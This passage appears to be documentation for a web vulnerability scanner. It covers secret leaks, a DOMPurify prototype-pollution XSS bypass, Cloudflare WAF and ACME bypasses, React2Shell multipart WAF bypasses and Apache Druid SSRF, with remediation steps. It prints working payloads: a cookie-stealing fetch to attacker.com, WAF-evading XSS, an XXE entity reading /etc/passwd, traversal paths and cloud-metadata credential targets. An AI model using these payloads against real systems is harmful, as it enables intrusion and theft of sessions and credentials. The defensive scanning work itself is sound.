| Report insecure dependency usage increased | **73%** |
| Report business logic vulnerabilities increased | **72%** |

**The core problem:** AI coding tools accelerate feature delivery by 49% but security validation
capacity grows far slower. The result: **66% of security work is manual validation** rather than
actual remediation — a "keep up" treadmill. bingo's AICodeSecSurface module addresses this by
automating the most time-consuming validation categories with VERIFIED PoC evidence.

#### Detection Categories

**A. Secrets Exposure (78% of practitioners report AI coding increases this)**

AI-assisted code frequently hard-codes credentials as placeholders that survive to production:

```
OpenAI / Anthropic / AWS / GCP / Stripe / GitHub / Twilio / SendGrid / Slack keys
JWT secrets · Database connection strings · Private key PEM blocks
AI-generated placeholder credentials (admin/test/changeme/your-key-here)
Hardcoded Basic Auth / Bearer JWT in JS bundles
```

**Detection method:** bingo scans JS bundles (up to 15 bundles, 200KB each), HTML responses,
and API responses using 22 secret patterns. Every match produces a VERIFIED curl PoC.

```bash
# Example VERIFIED PoC output:
curl -sk "https://target.com/static/js/main.2a3f8c.js" | grep -oP "sk-[A-Za-z0-9]{20,50}"
# Result: sk-proj-abc123...  ← live OpenAI key in production bundle
```

**B. Vulnerable Dependency Fingerprinting (73% report increase)**

AI coding assistants frequently suggest outdated library versions that were in training data:

```
lodash@4.17.15  → CVE-2021-23337 (prototype pollution RCE)
moment@2.29.1   → CVE-2022-24785 (path traversal + ReDoS)
axios@0.21.0    → CVE-2020-28168 (SSRF)
log4j@2.14.1    → CVE-2021-44228 (Log4Shell — CRITICAL)
Spring@5.3.17   → CVE-2022-22965 (Spring4Shell RCE)
jQuery@1.12.4   → CVE-2019-11358 (prototype pollution)
next@14.1.0     → CVE-2024-56332 (SSRF via image optimization)
```

**Detection method:** Version extraction from HTTP headers, JS bundles, error pages.
Correlation with CVE database. LIKELY evidence level for matched CVE versions.

**C. AI Coding Artifact Detection (72% report business logic vulnerabilities increased)**

Common patterns left by AI code generators that survive to production:

| Artifact | Example | Severity |
|----------|---------|----------|
| CORS wildcard | `Access-Control-Allow-Origin: *` | High |
| Debug route | `/debug`, `/test`, `/api/debug` | High |
| Default creds | `password: "admin"` in response | Critical |
| Unauthenticated admin | `"isAdmin": true` in 200 response | High |
| TODO security comment | `// TODO: add auth here` | Medium |
| Node.js stack trace | `at Object.<anonymous> (app.js:42)` | Medium |
| Mass assignment | `"role": null` in public API | Medium |

**D. Config/Credential File Exposure (30+ paths)**

AI-scaffolded projects commonly expose configuration files that should be server-protected:

```
.env / .env.local / .env.production        ← environment variables
credentials.json / service-account.json    ← GCP credentials
.git/config / .git/HEAD                    ← git repository info
/actuator/env / /actuator/heapdump         ← Spring Boot full env + heap dump
config/database.yml / config/secrets.yml   ← Rails credentials
docker-compose.yml / Dockerfile            ← infrastructure config
```

**E. Business Logic Surface Mapping (15 AI scaffold endpoint patterns)**

```
/api/price    → price manipulation (negative values, 0, overflow)
/api/transfer → race condition (double spend)
/api/balance  → IDOR + race condition
/api/admin    → missing auth middleware (AI scaffold omission)
/api/user     → mass assignment (role escalation via PUT/PATCH)
/api/checkout → total price manipulation
/api/coupon   → reuse + brute force
/api/credit   → race condition + negative credit
```

#### AI Auto-Trigger Logic

```python
# Always triggers on all web targets (universal — no condition required)
# AICodeSecSurface is activated as Phase 21 on every bingo scan
result.ai_code_sec_triggered = True  # unconditional
```

Unlike other bingo skills that require specific fingerprints (Ruby headers, CVE patterns, etc.),
AICodeSecSurface runs on **every web target** because:
1. AI-generated code is ubiquitous — affects all languages and frameworks
2. Secret scanning has near-zero false positive cost
3. Config file exposure check is lightweight (30 HTTP GETs)

#### Output Example

```
🤖 AI decision: AI-generated code security surface scan activated
🔴 Secret exposed: openai_key at /static/js/main.3f2c.js | Preview: sk-proj-a*** [VERIFIED]
🚨 .env file publicly accessible — full env vars / API keys exposed!
⚠️  Vulnerable dependency: lodash@4.17.15 — CVE-2021-23337 (prototype pollution RCE) [LIKELY]
🔍 AI coding artifact: CORS wildcard (*) — AI boilerplate default [VERIFIED]
📊 Business logic surface: /api/transfer (200) — test for race condition [LIKELY]
🔴 Spring Actuator exposed — full env vars / heap dump exposed (/actuator/env)

🧩 AICodeSecSurface: 47 findings | secrets:3 | deps:5 | artifacts:12 | bizlogic:15 | config:12
```

#### Evidence Levels

| Level | Meaning | Example |
|-------|---------|---------|
| `VERIFIED` | Secret found + accessible + real-looking value | `.env` returns 200 with `DB_PASSWORD=prod123` |
| `LIKELY` | Pattern matched, value real but not confirmed exploitable | `lodash@4.17.15` in bundle, CVE exists |
| `INFERRED` | Dependency version leaked, CVE exists but not confirmed | `next@14.0.0` header, version near-CVE |
| `AI_ANALYSIS` | Pattern suggests AI artifact but needs manual verification | CORS * without credentials check |

#### Quick Remediation

```bash
# 1. Rotate all exposed credentials IMMEDIATELY
# 2. Add gitleaks to pre-commit:
brew install gitleaks && gitleaks install

# 3. Block .env in nginx:
location ~ /\.env { deny all; return 404; }

# 4. Fix CORS:
# BAD:  res.header('Access-Control-Allow-Origin', '*')
# GOOD: res.header('Access-Control-Allow-Origin', process.env.ALLOWED_ORIGIN)

# 5. Disable Spring Actuator sensitive endpoints:
# management.endpoints.web.exposure.include=health,info

# 6. Update vulnerable dependencies:
npm audit fix --force
```

---

### DOMPurify Prototype Pollution → XSS Bypass — DOMPurifyPPBypass (v2.1)

> **Research basis:**
> trace37 labs — offensive security research
> "CVE-2026-41238: How Prototype Pollution Turns DOMPurify Into an XSS Gadget"
> https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/
> GitHub Advisory: GHSA-v9jr-rg53-9pgp
> **CVE:** CVE-2026-41238 | **Affected:** DOMPurify 3.0.1–3.3.3 | **Fixed:** DOMPurify 3.4.0
> **CWE:** CWE-79 (XSS) + CWE-1321 (Prototype Pollution)
> **Skill module:** `DOMPurifyPPBypass` (id: 57)

---

#### Background

DOMPurify is the most widely deployed client-side HTML sanitizer in the world — trusted by millions
of web applications to prevent Cross-Site Scripting. Despite being specifically designed to prevent
XSS, a subtle architectural flaw in versions 3.0.1–3.3.3 allows an attacker who can trigger
**Prototype Pollution** elsewhere in the application to **completely neutralize DOMPurify's sanitization**.

The attack is a two-step chain:

**Step 1 — Prototype Pollution Primitive**

The attacker uses a PP gadget already present in the application to inject `RegExp` objects into
`Object.prototype`. Common PP sources:

| Library | Vulnerable range | CVE |
|---------|-----------------|-----|
| lodash  | < 4.17.21 | CVE-2021-23337 |
| jQuery  | < 3.4.0   | CVE-2019-11358 |
| qs      | < 6.7.3   | CVE-2022-24999 |
| minimist | < 1.2.6  | CVE-2021-44906 |
| hoek    | < 6.1.3   | CVE-2018-3728  |

> **Critical nuance:** Most URL/JSON PP vectors produce _strings_ on `Object.prototype`.
> This bypass requires actual **`RegExp` object** injection (type-preserving merge).
> Vectors: JavaScript `postMessage` handlers with deep-merge, server-side jsdom + vulnerable merge.

**Step 2 — DOMPurify CUSTOM_ELEMENT_HANDLING Fallback**

In vulnerable DOMPurify, when no configuration is supplied, the default fallback is:

```js
// DOMPurify internals (3.0.1–3.3.3)
CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
//                                                      ^^
// {} inherits from Object.prototype — pollution flows in!
```

If `Object.prototype.tagNameCheck` has been set to `/.*/`, then:

```js
if (CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
    regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, lcTagName)) {
    return true;  // ← ALL custom element tags allowed
}
```

Every subsequent `DOMPurify.sanitize()` call passes XSS payloads through unchanged.

#### Attack Payloads (after PP)

```html
<x-foo onclick=alert(document.domain)>click me</x-foo>
<custom-element onmouseover=alert(1)>hover</custom-element>
<a-b onfocus=alert(1) autofocus>focus me</a-b>
<x-y onload=fetch('https://attacker.com?c='+document.cookie)>
```

Any **hyphenated element name** (HTML custom element) + **any event handler** = XSS after PP.

#### Detection Categories

**1. DOMPurify Version Fingerprinting (`VERIFIED`)**

Extracts version from JS bundles, package.json, CDN paths:
```
DOMPurify.version = "3.1.2"        → VULNERABLE (3.0.1–3.3.3)
/*! DOMPurify 3.4.0               → PATCHED
"dompurify": "3.2.0"              → VULNERABLE
```

**2. Prototype Pollution Gadget Detection (`VERIFIED`)**

Fingerprints vulnerable library versions in bundles and package.json:
```
lodash/3.10.1       → PP gadget (_.merge) — CVE-2021-23337
jquery/3.3.1        → PP gadget ($.extend) — CVE-2019-11358
qs@6.5.0            → PP gadget (allowPrototypes) — CVE-2022-24999
```

**3. CUSTOM_ELEMENT_HANDLING Default Config Usage (`LIKELY`)**

Detects `DOMPurify.sanitize(input)` without explicit configuration object.

**4. Combined Chain Scoring (`LIKELY → CRITICAL`)**

When both conditions are met simultaneously:
```
DOMPurify 3.0.1–3.3.3  +  PP gadget present  →  CRITICAL
```

**5. postMessage + Deep-Merge Detection (`INFERRED`)**

```js
window.addEventListener('message', (e) => {
    Object.assign(config, JSON.parse(e.data));  // type-preserving PP vector
});
```

#### AI Auto-Trigger Logic

```
all web targets (http/https)
  └─ JS bundle analysis (always runs — fast, low overhead)
       ├─ DOMPurify detected?
       │    ├─ version 3.0.1–3.3.3 → VULNERABLE (log VERIFIED)
       │    ├─ version ≥ 3.4.0 → PATCHED (log VERIFIED)
       │    └─ unknown version → continue scanning
       ├─ PP gadget libraries detected?
       │    └─ log per-library version + CVE
       ├─ Both DOMPurify vuln + PP gadget?
       │    └─ emit CRITICAL combined_chain finding
       ├─ postMessage + merge pattern?
       │    └─ emit INFERRED postmessage_pp finding
       └─ package.json exposed?
            └─ emit VERIFIED package_json_exposed finding
```

#### Browser Console PoC (for Burp Validation)

```js
// Step 1: Pollute Object.prototype with RegExp (simulating PP gadget)
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;

// Step 2: Test DOMPurify sanitization bypass
const payload = '<x-foo onclick=alert(document.domain)>XSS</x-foo>';
const clean = DOMPurify.sanitize(payload);

// VULNERABLE:  clean === '<x-foo onclick=alert(document.domain)>XSS</x-foo>'
// PATCHED:     clean === '<x-foo>XSS</x-foo>'  (onclick removed)

console.log(clean.includes('onclick') ? '🚨 BYPASS CONFIRMED' : '✅ PATCHED');
```

#### Output Example

```
🔬 AI decision: DOMPurify PP→XSS bypass scan activated (CVE-2026-41238)
📦 DOMPurify 3.2.1 detected [VERIFIED] — VULNERABLE (CVE-2026-41238) (found at: /static/js/main.js)
🚨 DOMPurify 3.2.1 in VULNERABLE range! CVE-2026-41238: Prototype Pollution → XSS bypass
⚡ PP gadget found: lodash 3.10.1 — lodash < 4.17.21 (_.merge PP, CVE-2021-23337) [VERIFIED]
💥 CVE-2026-41238 full attack chain! DOMPurify 3.2.1 + PP gadget [lodash@3.10.1] CRITICAL [LIKELY]
📄 package.json exposed — dependency info publicly accessible [VERIFIED]

DOMPurifyPPBypass scan done: 4 findings | DP_ver:3.2.1 | vuln:True | PP_gadgets:1 | sev:critical
```

#### Evidence Levels

| Finding | Evidence Level | Reason |
|---------|---------------|--------|
| DOMPurify version from JS bundle | `VERIFIED` | Direct extraction from source |
| PP gadget library version | `VERIFIED` | Version string from bundle/package.json |
| Default config usage pattern | `LIKELY` | Code pattern match |
| Combined chain (DP vuln + PP gadget) | `LIKELY` | Both conditions verified, chain needs real PP trigger |
| postMessage + merge pattern | `INFERRED` | Pattern match; PP type preservation unverified |

#### Quick Remediation

```bash
# 1. Upgrade DOMPurify immediately
npm install dompurify@latest   # ≥ 3.4.0

# 2. Patch PP gadget libraries
npm install lodash@4.17.21 jquery@3.4.0 qs@6.7.3

# 3. Always specify CUSTOM_ELEMENT_HANDLING explicitly
DOMPurify.sanitize(html, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /^(b|i|u|em|strong)$/,  // allowlist only
    attributeNameCheck: /^(class|id)$/,
    allowCustomizedBuiltInElements: false
  }
});

# 4. Freeze Object.prototype in production
Object.freeze(Object.prototype);  // prevents all PP
```

---

### CSPT + Cloudflare WAF Bypass + Multi-ContentType Fuzzing — CSPTWafBypass (v2.1)

> **Research basis:**  
> Intigriti Bug Bytes #235 (April 2026)  
> https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-235-april-2026  
> Contributors: @xssdoctor (CSPT), @YourFinalSin (Cloudflare WAF bypass → ATO), @RenwaX23 (Cookie XSS)  
> **Skill module:** `CSPTWafBypass` (id: 56)

---

#### Background: Four Emerging Attack Vectors Combined

**Bug Bytes #235** aggregates four independently discovered attack techniques that together form
a powerful attack chain targeting modern JavaScript-heavy applications:

| # | Technique | Researcher | Impact |
|---|-----------|------------|--------|
| 1 | Client-Side Path Traversal (CSPT) | @xssdoctor | Unauthorized API access / IDOR |
| 2 | Cloudflare WAF bypass via `oncontentvisibilityautostatechange` | @YourFinalSin | XSS → Full ATO |
| 3 | Cookie injection → DOM XSS | @RenwaX23 | Session hijacking |
| 4 | Auxclick (middle mouse) clickjacking | community | Clickjacking bypass |

---

#### Detection Category 1: Client-Side Path Traversal (CSPT)

**What is CSPT?**  
CSPT occurs when client-side JavaScript constructs API/resource URLs using user-controllable input
(URL parameters, routing fragments, query strings) without path traversal validation.
Unlike server-side path traversal, the **browser is the attacker's proxy** — the SPA's own routing
framework resolves `../` sequences and passes the normalized path to backend API calls.

**Affected frameworks (all major SPAs):**

```javascript
// React Router — router params in API fetch
const { id } = useParams();
fetch('/api/user/' + id + '/data');  // ← CSPT if id = "../../admin/users"

// Next.js — router.query in API call
const router = useRouter();
fetch('/api/' + router.query.path + '/details');  // ← CSPT

// Angular — ActivatedRoute in HttpClient
this.route.params.subscribe(p =>
  this.http.get('/api/' + p['id'] + '/resource').subscribe()  // ← CSPT
);

// Vue — $route.params in axios
axios.get('/api' + this.$route.params.slug + '/data');  // ← CSPT
```

**Attack example:**

```
Legitimate URL: /app/user/profile/123
CSPT payload:   /app/user/profile/123/../../admin/users
JS fetch:       fetch('/api' + '/app/user/profile/123/../../admin/users/data')
Resolved:       fetch('/api/admin/users/data')  ← UNAUTHORIZED
```

**bingo detection:**
- Scans up to 10 JS bundles for 8 CSPT pattern signatures
- Tests 21 traversal encodings (`../`, `%2f..%2f`, `%2e%2e/`, `%252e%252e/`, etc.)
- Returns `VERIFIED` evidence when server responds HTTP 200 to traversal path
- Auto-generates framework-specific curl PoC

---

#### Detection Category 2: Cloudflare WAF Bypass — `oncontentvisibilityautostatechange`

**Discovery:** @YourFinalSin (April 2026, Bug Bytes #235)

Cloudflare's WAF blocks well-known event handlers (`onclick`, `onload`, `onerror`, `onmouseover`…),
but the **CSS Containment API's** `oncontentvisibilityautostatechange` attribute was not filtered
as of April 2026.

**Bypass payload:**
```html
<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>
```

**Full Account Takeover chain:**
```
1. Find reflected XSS input point (blocked by Cloudflare WAF with classic payloads)
2. Use bypass: <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>
3. Cloudflare WAF passes the request → XSS fires in victim's browser
4. Payload: fetch('https://attacker.com/steal?c='+document.cookie)
         or: intercept OAuth authorization code from page URL/response
5. Exchange stolen OAuth code for access token → Full Account Takeover
```

**bingo provides 7 bypass payloads** including:
- `oncontentvisibilityautostatechange` (primary, CF WAF bypass)
- `onanimationstart`, `ontransitionend` (CSS event handlers)
- `onpointerdown`, `ondragstart` (Pointer/Drag API)
- `onauxclick` (middle mouse — also for clickjacking)
- mXSS via innerHTML comment parsing

---

#### Detection Category 3: Multi-Content-Type API Fuzzing

Many API endpoints behave differently depending on the `Content-Type` header. WAF rules and
input validation are often Content-Type–specific, creating blind spots:

| Content-Type | Risk if Accepted |
|---|---|
| `text/xml` | XXE (XML External Entity injection) |
| `application/x-www-form-urlencoded` | Bypasses JSON-specific WAF rules |
| `application/graphql` | Hidden GraphQL endpoint |
| `application/x-yaml` | YAML deserialization (Python/Ruby) |
| `multipart/form-data` | File upload to non-upload endpoints |

**bingo fuzzes 14 Content-Types** on discovered API endpoints and flags:
- XML accepted → generates XXE PoC (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
- Form-urlencoded accepted → WAF bypass potential flag
- Unexpected 200 on any non-JSON Content-Type → manual investigation recommended

---

#### Detection Category 4: Cookie Injection → DOM XSS

**Researcher:** @RenwaX23

When applications set cookie values based on user input **and** those cookies are later read
into DOM sinks (`innerHTML`, `document.write`, `eval`), an attacker who can inject cookie values
(via XSS, CRLF injection, or subdomain cookie setting) can achieve DOM XSS.

**bingo detects:** `document.cookie` → `innerHTML`/`eval` data flow patterns in JS source.

---

#### Detection Category 5: Auxclick Clickjacking

The `onauxclick` event fires on **middle mouse button** clicks — a vector that:
- Is not blocked by `X-Frame-Options` (different execution context)
- Works even when classic clickjacking defenses are present
- Can trigger sensitive actions (password reset, OAuth authorization, payments)

**bingo checks** for missing `X-Frame-Options` and `CSP frame-ancestors`, and generates
both classic and auxclick-specific PoC payloads.

---

#### AI Auto-Trigger Logic

```python
# Activation conditions (all web targets):
triggers = {
    "spa_framework": "React/Angular/Vue/Next.js detected in JS bundles",
    "cloudflare":    "cf-ray / cf-cache-status header present",
    "oauth":         "OAuth/SSO endpoints (/auth, /oauth, client_id=) found",
    "default":       "Activated on all web targets (universal)",
}
```

---

#### Output Example

```
🌐 AI decision: CSPT+CloudflareWAF bypass+MultiContentType scan activated
☁ Cloudflare WAF detected: https://target.com — oncontentvisibilityautostatechange bypass ready
🖥 SPA framework detected: react — running CSPT path traversal tests...
🔴 CSPT pattern: fetch_location in /static/js/main.js — location.pathname → API call [LIKELY]
🔴 CF WAF bypass: oncontentvisibilityautostatechange — CF WAF bypassed → XSS → OAuth ATO [LIKELY]
🔴 OAuth ATO chain: CF bypass XSS → OAuth code theft → Full ATO [LIKELY]
🟡 ContentType fuzzing: /api/v1/data — text/xml accepted (XXE possible) [LIKELY]
🟡 Cookie injection → DOM XSS: document.cookie → innerHTML sink [LIKELY]
🟡 Auxclick clickjacking: no X-Frame-Options detected [VERIFIED]
🧩 CSPTWafBypass: 6 findings | CF:True | SPA:react | CSPT_patterns:1 | CF_bypass:7 | sev:high
```

---

#### Evidence Levels

| Finding Type | Evidence Level | Condition |
|---|---|---|
| CSPT endpoint 200 response | `VERIFIED` | Server returned 200 on traversal URL |
| CSPT JS pattern | `LIKELY` | Pattern found in JS bundle code |
| CF WAF bypass payload | `LIKELY` | Cloudflare headers detected |
| OAuth ATO chain | `LIKELY` | CF + OAuth both detected |
| Content-Type XXE | `LIKELY` | XML accepted, baseline rejected |
| Cookie XSS / Auxclick | `INFERRED` | DOM sink pattern or header absence |

---

#### Quick Remediation

| Finding | Priority | Fix |
|---|---|---|
| CSPT | CRITICAL | Sanitize `location.pathname`/router params before API calls; server-side path whitelist |
| CF WAF bypass | HIGH | Add custom CF rule for `oncontentvisibilityautostatechange`; enforce strict CSP |
| OAuth ATO chain | CRITICAL | PKCE mandatory; strict `redirect_uri`; revoke all tokens immediately |
| XML Content-Type XXE | HIGH | Whitelist `application/json` only; disable DOCTYPE in XML parsers |
| Cookie XSS | HIGH | `HttpOnly` on all cookies; use `textContent` not `innerHTML` |
| Auxclick clickjacking | MEDIUM | `X-Frame-Options: DENY` + `CSP: frame-ancestors 'none'` |

### Cloudflare ACME WAF Bypass — CloudflareACMEBypass (v2.1)

> **Research basis:**
> FearsOff Security — Kirill Firsov
> "Cloudflare Zero-day: Accessing Any Host Globally"
> https://fearsoff.org/research/cloudflare-acme
>
> Cloudflare Official Post-mortem (January 2026):
> https://blog.cloudflare.com/acme-path-vulnerability/
>
> **Module:** `bingo/tools/cloudflare_acme_bypass.py` — Skill #58

---

#### The Vulnerability: ACME HTTP-01 "Fail-Open" Logic

Cloudflare's edge network implements ACME (Automatic Certificate Management Environment) support,
temporarily **disabling WAF protections** on the path `/.well-known/acme-challenge/{token}` to
allow Certificate Authorities to validate domain ownership without interference.

The bug: Cloudflare failed to verify whether the token in the request matched an **active ACME
challenge for that specific hostname**. If the token belonged to a different zone — or was
completely arbitrary — Cloudflare **still disabled WAF and forwarded the request directly to the
origin server**.

```
Normal request → /.well-known/test
                 → Cloudflare WAF enforced ✅ → 403 block page

Bypass request → /.well-known/acme-challenge/FAKE_TOKEN
                 → WAF DISABLED ❌ → Direct origin server contact
```

- **Reported:** October 9, 2025 (HackerOne Bug Bounty)
- **Validated:** October 13, 2025
- **Patched:** October 27, 2025
- **Disclosed:** January 19, 2026
- **Researcher:** Kirill Firsov (FearsOff Security)

---

#### Impact: What an Attacker Could Do via the Bypass Path

| Attack | Description | Impact |
|--------|-------------|--------|
| **Origin IP Discovery** | Real server responds without CF obfuscation | HIGH |
| **IP Allowlist Bypass** | CF IP-block rules become ineffective | HIGH |
| **LFI (PHP apps)** | `/../../../etc/passwd` via ACME prefix | CRITICAL |
| **Spring Actuator Exposure** | `/actuator/env` returns env variables | HIGH |
| **SSRF** | `X-Forwarded-For: 127.0.0.1` reaches origin | HIGH |
| **Cache Poisoning** | `X-Forwarded-Host: evil.com` poisons cache | HIGH |
| **Method Override** | `X-HTTP-Method-Override: DELETE` bypasses checks | MEDIUM |
| **Debug Toggle** | Custom debug headers bypass WAF guard | MEDIUM |
| **Next.js SSR Leak** | Internal SSR details exposed | MEDIUM |

---

#### What bingo Tests

```python
# Step 1: Confirm Cloudflare presence
GET https://target.com/  →  check CF-Ray, server: cloudflare

# Step 2: Control test (should be blocked)
GET https://target.com/bingo-waf-control-test  →  expect 403

# Step 3: ACME bypass test (core check)
GET https://target.com/.well-known/acme-challenge/bingo-acme-test-xBz9kPqR7wN2mLcV
 →  if origin responds (non-CF server header / no CF-Ray) → BYPASS CONFIRMED

# Step 4: Header attack vectors (if bypass confirmed)
GET .../acme-challenge/TOKEN  -H "X-Forwarded-For: 127.0.0.1"
GET .../acme-challenge/TOKEN  -H "X-Original-URL: /admin"
GET .../acme-challenge/TOKEN  -H "X-Forwarded-Host: evil.example.com"

# Step 5: LFI test
GET .../acme-challenge/TOKEN/../../../etc/passwd

# Step 6: Spring Actuator
GET .../acme-challenge/TOKEN/actuator/env
```

---

#### Evidence Levels

| Finding | Evidence Level | Description |
|---------|---------------|-------------|
| Origin server reached | `VERIFIED` | CF-Ray absent + non-CF server header |
| WAF bypass + header attacks | `LIKELY` | Bypass confirmed, headers sent but response ambiguous |
| Spring Actuator / LFI | `INFERRED` | Path tested but content not definitively matched |

---

#### Remediation

```nginx
# 1. Restrict origin to Cloudflare IPs only
# https://www.cloudflare.com/ips/
allow 103.21.244.0/22;
allow 103.22.200.0/22;
# ... (full list)
deny all;
```

```
# 2. Cloudflare Dashboard → SSL/TLS → Origin Server → Authenticated Origin Pulls
# Enable mTLS so only genuine CF edge can contact origin

# 3. Verify patch: CF-Ray header must be present on ALL paths including
#    /.well-known/acme-challenge/* after October 27, 2025 fix
```

| Check | Before Patch | After Patch |
|-------|-------------|-------------|
| Normal path `/test` | WAF enforced ✅ | WAF enforced ✅ |
| ACME path (valid token, CF-managed) | WAF bypassed (intended) ✅ | WAF bypassed (intended) ✅ |
| ACME path (fake/wrong zone token) | **WAF bypassed ❌** | WAF enforced ✅ |

---

### React2Shell WAF Bypass — React2ShellWafBypassScanner (v2.1)

> **Research basis:**
> Hacktron AI — ginoah, Mohan (May 4, 2026)
> "$170k in Bypasses: The Vercel React2Shell Challenge"
> https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass
>
> Original vulnerability:
> **CVE-2025-55182** — Pre-auth RCE in React Server Functions (Next.js 15.x – 16.0.6)

#### The Attack: React2Shell (CVE-2025-55182)

React Server Functions (RSF) — exposed via the `Next-Action` HTTP header —
allow clients to invoke server-side functions directly. A prototype pollution
gadget in `react-server-dom-webpack` allows an attacker to send a crafted
multipart body containing `:constructor` that chains to `child_process.exec`,
achieving **pre-authentication RCE** against any Next.js server running
15.x through 16.0.6.

**Affected frameworks:** Next.js, react-router, Waku, @parcel/rsc, @vitejs/plugin-rsc, rwsdk

**Patched:** Next.js 16.0.7 (May 2026)

#### The WAF Problem: Grammar Un-equivalence

Vercel deployed a WAF to block `:constructor` patterns in multipart bodies.
The WAF was bypassed **five times** using "grammar un-equivalence" — exploiting
the fact that the WAF and the backend HTTP parser (Node.js `busboy`) interpret
malformed multipart requests differently.

Each bypass earned **$50,000**, totaling **$170,000** in the challenge.

#### The Five Bypass Techniques

| ID | Technique | WAF Behavior | busboy (backend) |
|----|-----------|-------------|-----------------|
| **BP1** | Duplicate `boundary=` parameter in `Content-Type` | Uses last boundary → body invisible | Uses first boundary → full parse |
| **BP2** | Non-UTF8 byte (e.g. `0x88`) in any header | Parser error → **fail-open** (all traffic passes) | Ignores invalid param, parses normally |
| **BP3** | `charset=utf16le` in per-field `Content-Type` | Scans raw bytes → `:constructor` not visible | Decodes UTF-16LE → `:constructor` appears |
| **BP4** | Duplicate `Content-Type` headers in field | Uses last header (`charset=utf8`) → safe | Uses first header (`charset=utf16le`) → decodes payload |
| **BP5** | Trailing space in boundary end marker (`--b-- `) | Sees form ended → ignores rest | Invalid end marker → parses subsequent parts normally |

#### What bingo Tests (Skill #59)

```python
# Step 1: Detect React/Next.js framework
# Fingerprints: x-powered-by: Next.js, x-nextjs-* headers,
#               Vercel deployment headers, _next/static assets

# Step 2: Find Next-Action endpoint
# Probes common paths with Next-Action header
# Any 200/400/500 (or 403+WAF) confirms RSF surface

# Step 3: Detect WAF
# Send :constructor payload → HTTP 403 = WAF active

# Step 4: Test all 5 bypass techniques (safe probe only)
# Uses harmless "bingo-r2s-probe-safe" string
# Checks if response != 403 with WAF active = bypass confirmed
# evidence_level = VERIFIED for confirmed bypasses

# Step 5: Generate PoC curl commands for Burp verification
# Full curl commands for each bypass technique
# NOTE: No actual RCE payload — human verification required in Burp
```

#### Evidence Levels

| Finding | Evidence Level | Meaning |
|---------|---------------|---------|
| Framework indicators | `VERIFIED` | HTTP headers/paths confirmed |
| Next-Action endpoint | `VERIFIED` | Endpoint accepts RSF requests |
| WAF bypass confirmed | `VERIFIED` | Safe probe passes WAF (status != 403) |
| WAF present, bypass not tested | `INFERRED` | No RSF endpoint reachable |

#### Remediation

1. **Upgrade to Next.js >= 16.0.7** — CVE-2025-55182 patched
2. **WAF raw-body approach** (for custom deployments):
   - Strip all `0x00` bytes from request body
   - Apply double JSON-unescape to raw body string
   - Block on `:constructor` in the resulting raw bytes
   - This defeats all grammar un-equivalence bypasses
3. **Disable React Server Functions** if not required by the application
4. **Monitor `Next-Action` header** — log and alert on all RSF invocations

#### Bypass-Specific Mitigations

| Bypass | Mitigation |
|--------|-----------|
| BP1 (duplicate boundary) | Reject requests with multiple `boundary=` params |
| BP2 (non-UTF8 header bytes) | Strict UTF-8 validation — reject on parse failure (fail-closed) |
| BP3/BP4 (UTF-16LE encoding) | Normalize field charsets before scanning; disallow non-UTF-8 charsets |
| BP5 (trailing space end marker) | Strict boundary end marker validation |

---

### Apache Druid SSRF — ApacheDruidSSRFScanner (v2.1)

> **Research basis:**
> XBOW Security — Nico Waisman (September 23, 2025)
> "CVE-2025-27888: Server-Side Request Forgery via URL Parsing Confusion
>  in Apache Druid Proxy Endpoint"
> https://xbow.com/blog/apache-druid-proxy
>
> **Module:** `bingo/tools/apache_druid_ssrf.py` — Skill #60 ApacheDruidSSRFScanner

---

#### What is Apache Druid?

Apache Druid is a high-performance real-time analytics database widely deployed in
data pipelines and analytics platforms. Its built-in management console exposes an
HTTP proxy endpoint intended for internal cluster administration.

---

#### The Vulnerability: CVE-2025-27888

**Affected versions:** Apache Druid < 31.0.2 and < 32.0.1

The management console's proxy endpoint (`/proxy?url=...`) performs insufficient
validation of the destination URL, allowing attackers to make the Druid server issue
HTTP requests to arbitrary destinations. This is a classic **Server-Side Request
Forgery (SSRF)** enabled by URL parsing confusion.

**Critical impacts:**

| Impact | Detail |
|--------|--------|
| Cloud credential theft | IMDSv1 at `169.254.169.254` → IAM keys for AWS account takeover |
| GCP/Azure metadata | `metadata.google.internal` → service account tokens |
| Internal network access | Reach services behind firewall via Druid as HTTP proxy |
| Druid cluster enumeration | Access coordinator/broker/overlord APIs on internal ports |
| Data exfiltration | Query internal datasource APIs through the proxy |

---

#### How XBOW AI Discovered It

The discovery was made by XBOW's AI security system, which:

1. Trained on historical CVE data — prior Druid SSRF vulnerabilities existed on task
   and SQL endpoints
2. **Reasoned by analogy**: "If proxy-adjacent features were vulnerable before, the
   management proxy itself might also be vulnerable"
3. **Guessed the `/proxy` endpoint** (not documented publicly) after exhausting known
   patterns
4. Confirmed SSRF by analyzing error messages from the endpoint's response

This represents a zero-day discovered entirely by AI reasoning over vulnerability history.

---

#### What bingo Tests (Skill #60)

```
1. Apache Druid Detection (VERIFIED)
   ├── Fingerprint /unified-console.html
   ├── Test /druid/coordinator/v1/isLeader
   ├── Detect x-druid-* response headers
   ├── Check port 8888 (Druid default)
   └── Extract version from HTML body

2. Proxy Endpoint Discovery (VERIFIED)
   ├── /proxy
   ├── /druid/proxy
   └── /druid/coordinator/v1/proxy
       → Send invalid-URL probe → analyze error response

3. SSRF Confirmation — Cloud Metadata (VERIFIED)
   ├── AWS IMDSv1: 169.254.169.254/latest/meta-data/
   ├── AWS IAM:    169.254.169.254/latest/meta-data/iam/security-credentials/
   ├── GCP:        metadata.google.internal/computeMetadata/v1/
   └── Azure:      169.254.169.254/metadata/instance

4. SSRF Confirmation — Internal Services (LIKELY)
   ├── localhost:80, localhost:8080
   └── Druid cluster nodes:
       ├── Coordinator :8081  /druid/coordinator/v1/datasources
       ├── Broker      :8082  /druid/v2/datasources
       ├── Overlord    :8090  /druid/indexer/v1/task
       └── Historical  :8083  /druid/historical/v1/loadstatus

5. PoC Generation
   └── Full curl commands for Burp Suite validation
```

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
